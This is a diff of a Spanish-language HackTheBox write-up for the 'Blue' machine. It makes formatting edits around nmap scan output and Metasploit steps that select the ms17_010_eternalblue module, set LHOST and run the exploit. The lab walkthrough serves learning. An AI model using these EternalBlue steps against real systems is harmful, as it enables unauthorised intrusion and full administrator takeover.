@@ -11,8 +11,6 @@ description : Tenemos una máquina nivel EASY Windows, en la que explotaremos la
 
 Tenemos una máquina nivel EASY Windows, en la que explotaremos la vulnerabilidad eternalblue del protocolo SMB, de forma automatizada con metasploit y no tendremos que escalar privilegios ya el propio exploit nos dará acceso al usuario Administrador.
 
-Write en video aquí --> [https://www.youtube.com/watch?v=WhwsoEtVrGo](https://www.youtube.com/watch?v=WhwsoEtVrGo)
-
 ![](/assets/images/HTB/Blue-HackTheBox/Blue2.webp)
 
 [![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)
@@ -40,7 +38,7 @@ Write en video aquí --> [https://www.youtube.com/watch?v=WhwsoEtVrGo](https://w
 
 Lanzamos el escaneo de puertos.
 
-```nmap
+```bash
 PORT    STATE SERVICE
 135/tcp open  msrpc
 139/tcp open  netbios-ssn
@@ -49,7 +47,7 @@ PORT    STATE SERVICE
 
 Lanzamos un escaneo mas detallado para saber que servicios y versiones se ejecutan en los puertos existentes que hay abiertos.
 
-```nmap
+```bash
 PORT    STATE SERVICE      VERSION
 135/tcp open  msrpc        Microsoft Windows RPC
 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
@@ -104,7 +102,7 @@ Explotaré la vulnerabilidad a través de metasploit.
 
 Buscando encuentro varios exploit, asique elijo el siguiente:
 
-> `exploit/windows/smb/ms17_010_eternalblue`
+> exploit/windows/smb/ms17_010_eternalblue
 
 ![](/assets/images/HTB/Blue-HackTheBox/msf1.webp)
 
@@ -119,7 +117,6 @@ set LHOST tun0
 ------------------------------------------------
 # Lanzamos el exploit
 exploit
----------------------
 ```
 
 ![](/assets/images/HTB/Blue-HackTheBox/msf2.webp)
